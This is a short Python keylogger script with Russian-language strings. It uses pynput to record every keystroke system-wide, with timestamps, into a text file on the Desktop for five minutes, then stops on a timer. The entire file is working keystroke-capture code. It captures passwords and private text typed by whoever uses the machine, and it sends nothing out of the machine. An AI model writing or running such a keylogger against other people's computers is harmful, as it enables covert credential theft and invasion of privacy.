from pynput import keyboard
from datetime import datetime, timedelta
import os
import threading

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "Фиксируем фиксируем))).txt")

def on_press(key):
    try:
        with open(desktop_path, "a") as file:
            file.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(desktop_path, "a") as file:
            file.write(f"{datetime.now()} - {key}\n")

def stop_listener(listener):
    listener.stop()

def dep():
    end_time = datetime.now() + timedelta(minutes=5)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    timer = threading.Timer((end_time - datetime.now()).total_seconds(), stop_listener, [listener])
    timer.start()

    print("Начали запись. Завершим через скоро короче")

if __name__ == "__main__":
    dep()
